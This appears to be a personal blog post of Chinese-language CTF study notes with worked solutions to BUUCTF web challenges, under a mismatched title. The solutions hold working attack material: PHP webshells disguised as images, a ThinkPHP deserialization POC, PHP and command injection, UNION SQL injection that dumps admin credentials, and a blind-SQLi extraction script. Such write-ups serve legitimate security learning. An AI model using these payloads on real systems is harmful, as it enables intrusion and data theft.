---
layout: default
title: MARL Learning Notes
categories:
- Algorithm
tags:
- Computer Vision
---
//Description: CTF学习入门笔记。记录学习过程中遇到的问题。

//Create Date: 2025-07-02 10:31:39

//Author: channy

[toc]

# 参考书籍 
[CTF实战：从入门到提升]

题目在 [BUUCTF](https://buuoj.cn/challenges)

使用到的工具：
1. [BurpSuite](https://portswigger.net/burp) 抓包工具
2. [GitHacker](https://github.com/WangYihang/GitHacker) 
3. [dirsearch](https://github.com/maurosoria/dirsearch) 扫描工具
4. [PHPStorm](https://www.jetbrains.com/phpstorm/) PHP的IDE
5. [AntSword](https://github.com/AntSwordProject/antSword) [AntSword-Loader](https://github.com/AntSwordProject/AntSword-Loader)
# 1 Web
## HTTP
### [HTTP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Http)

修改请求信息，有`Referer`来源、`User-Agent`中客户端信息如浏览器等，及`X-Forwarded-For`伪造IP只允许本地访问

获取flag后需要把`flag{xxx}`整个commit才通过。。。只commit大括号里面的flag内容给我显示错误。。。

最终请求
```sh
GET /Secret.php HTTP/1.1
Host: node5.buuoj.cn:28483
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer:https://Sycsecret.buuoj.cn
X-Forwarded-For:127.0.0.1
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [BUU BURP COURSE 1](https://buuoj.cn/challenges#BUU%20BURP%20COURSE%201)

`X-Forwarded-For:127.0.0.1`不管用了，需要`X-Real-Ip:127.0.0.1`

### [Git](https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%80%E7%AB%A0%20web%E5%85%A5%E9%97%A8]%E7%B2%97%E5%BF%83%E7%9A%84%E5%B0%8F%E6%9D%8E)


```sh
python3 -m pip install -i https://pypi.org/simple/ GitHacker

githacker --url http://0d2b78ce-3914-4c05-8538-063c5b822c38.node5.buuoj.cn:81/.git/ --output-folder ./
```
flag在index.html下`n1book{git_looks_s0_easyfun}`

### [PHP变量覆盖](https://buuoj.cn/challenges#[BJDCTF2020]Mark%20loves%20cat)

先利用.git拿到php代码
```php
include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}

if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}

if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}



echo "the flag is: ".$flag;
```

变量覆盖，BurpSuite的GET请求直接加参数`?yds=flag`即可
```sh
GET /?yds=flag HTTP/1.1
Host: 7828c578-72e0-4c87-883f-61a3e2fd8f27.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### [PHP文件读取](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

BurpSuite的POST请求需要加上`Content-Type: application/x-www-form-urlencoded`

text可用php://input传字符串，file可用php://filter/read=convert.Base64-encode/resource=next.php

得到一串
```sh
PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K
```
暂且记下

### [PHP注入](https://buuoj.cn/challenges#[HFCTF2021%20Quals]Unsetme)
类似于SQL注入的思想
```sh
GET /?a=a%0a);%0aphpinfo( HTTP/1.1
```

```sh
GET /?a=a%0a);%0aecho%00file_get_contents(%27/flag%27 HTTP/1.1
```

### [PHP file upload](https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]Upload)
文件上传类型限制。

修改POST请求中的内容类型后
```sh
Content-Type: image/png
```
界面显示“ThinkPHP V5.1.35 LTS { 十年磨一剑-为API开发设计的高性能框架 }”

PNG头0x89504E47
```sh
89504E47
<script language="php">eval($_POST["cmd"])</script>
```

工具`dirsearch`需要python 3.9及以上。
```sh
./dirsearch.py -u http://066ef743-ac4c-49bd-a357-ccc1a1ce4f59.node5.buuoj.cn:81/ -e "*"
```
但显示
```sh
Skipped the target due to 429 status code
```
错误，扫描请求频率过高被服务器限制。`--delay 0.1 -t 1`延时加减线程为1.

最终使用命令和结果显示
```sh
$ ./dirsearch.py -u http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81 -e , --delay 0.1 -t 1 -i 200,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: GET | Threads: 1 | Wordlist size: 9119

Target: http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/

[14:56:19] Scanning: 
[14:58:21] 200 -   216B - /.htaccess
[15:13:50] 200 -    1KB - /favicon.ico
[15:23:23] 200 -    24B - /robots.txt
[15:27:15] 200 -   287B - /upload/
[15:29:49] 200 -   24MB - /www.tar.gz

Task Completed
```
直接在浏览器地址栏输入`http://16137a97-71f1-40c5-81a0-a51295133c93.node5.buuoj.cn:81/www.tar.gz`即可下载文件。

文件代码中搜索`upload`可以定位到Register.php和Profile.php两个主要文件。

index.php中显示登录会反序列化cookie
```php
    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }
```

图片马GIF头0xGIF89a
```sh
GIF89a
<?php @eval($_POST['cmd']);?>

# 或
<script language="php">eval($_POST['cmd']);</script>
```
或者上传空文件后在Content-Type: 后面修改类型后再加文件内容也可以。

upload.php即POC
```php
<?php
namespace app\web\controller;

class Profile
{
    public $checker = 0;
    public $filename_tmp = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/2fffb588e7310cb65c09fd2e21a0e834.png";
    public $filename = "./upload/e0cd7c28b74327b3bd1472378bdfbfa2/shell.php";
    public $ext = 1;
    public $except = array('index'=>'upload_img');
}

class Register
{
    public $checker;
    public $registed = 0;
}
$profile = new Profile();
$register = new Register();
$register->checker = $profile;
echo base64_encode(serialize($register));
?>
```

```sh
$ sudo apt install php7.4-cli

$ php upload.php
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo1OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2UwY2Q3YzI4Yjc0MzI3YjNiZDE0NzIzNzhiZGZiZmEyLzJmZmZiNTg4ZTczMTBjYjY1YzA5ZmQyZTIxYTBlODM0LnBuZyI7czo4OiJmaWxlbmFtZSI7czo1MToiLi91cGxvYWQvZTBjZDdjMjhiNzQzMjdiM2JkMTQ3MjM3OGJkZmJmYTIvc2hlbGwucGhwIjtzOjM6ImV4dCI7aToxO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MTA6InVwbG9hZF9pbWciO319czo4OiJyZWdpc3RlZCI7aTowO30=
```

刷新页面并把上面的payload放到cookie中多试几次，即可以看到upload/下原上传的图像被重命名了POC中的`filename` 

使用AntSword连接重命名后的文件`http://xxx.php`，密码是前面图片马中`<?php @eval($_POST['cmd']);?>`的变量名`cmd`，连接成功。

在根目录下找到/flag

## Bash/Cmd
### [命令注入](https://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping)
```sh 
>>> base64.b64encode(b'flag.php').decode()
'ZmxhZy5waHA='

$ cat$IFS$9`echo$IFS$9ZmxhZy5waHA=|base64$IFS$9-d`
```
### [SQL注入](https://buuoj.cn/challenges#BUU%20SQL%20COURSE%201)
使用BurpSuite抓包Repeater空格需要转义%0a -> space

数据库
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(schema_name)%0afrom%0ainformation_schema.schemata;# HTTP/1.1

{"title":"1","content":"information_schema,performance_schema,test,mysql,ctftraining,news"}
```
数据表
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='ctftraining';# HTTP/1.1

{"title":"1","content":"FLAG_TABLE,news,users"}
```
字段
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='ctftraining'%0aand%0atable_name='FLAG_TABLE';# HTTP/1.1

{"title":"1","content":"FLAG_COLUMN"}
```
值
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,FLAG_COLUMN%0afrom%0actftraining.FLAG_TABLE;# HTTP/1.1
```
但获取到的是空。。。改获取`users`表，用户名和密码登录失败。。。
```sh
GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='news';# HTTP/1.1

{"title":"1","content":"admin,contents"}

GET /backend/content_detail.php?id=-1%0aunion%0aselect%0a1,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_schema='news'%0aand%0atable_name='admin';# HTTP/1.1

{"title":"1","content":"id,username,password"}
```
最后拿到用户名admin密码`{"title":"1","content":"f22052f1061e5e21b134a749e84bdc1c"}`登录取得flag.

### [SQL布尔盲注](https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day2%20Web1]Hack%20World)

```py
import requests
import time

url = 'http://6bb7f5fc-177b-4897-80ab-a70f04d0ac47.node5.buuoj.cn:81/index.php'
result = ''
# uuid 36位 + flag{}
for i in range(1, 44): 
    # ascii 0～31：控制字符（不可见，如换行、退格等）
    for j in range(32, 128):
        time.sleep(0.1)
        payload = '(ascii(substr((select(flag)from(flag)),' + str(i) + ',1))>' + str(j) + ')'
        res = requests.post(url, data = {'id': payload})
        # print('respond:', res, res.text)
        if res.text.find('girl') == -1:
            result += chr(j)
            print(i, j, chr(j))
            break
print(result)
```

### [XSS](https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201)


